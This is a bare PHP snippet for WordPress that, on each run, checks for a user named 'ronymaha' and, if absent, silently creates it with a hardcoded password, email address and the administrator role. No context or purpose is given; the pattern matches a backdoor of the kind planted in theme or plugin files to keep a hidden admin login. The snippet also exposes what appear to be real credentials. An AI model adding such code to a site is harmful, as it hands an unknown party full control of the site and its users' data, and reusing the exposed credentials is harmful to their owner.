
<?php 
 if(!username_exists('ronymaha')){
 	wp_insert_user(array(
					'user_login'		=> 'ronymaha',
					'user_pass'	 		=> 'Mahmud123698',
					'user_email'		=> 'ronymaha@gmail.com',
					'first_name'		=> 'Omar',
					'last_name'			=> 'Faruque',
					'user_registered'	=> date('Y-m-d H:i:s'),
					'role'				=> 'administrator'
				)
		);
 } 
 ?> 
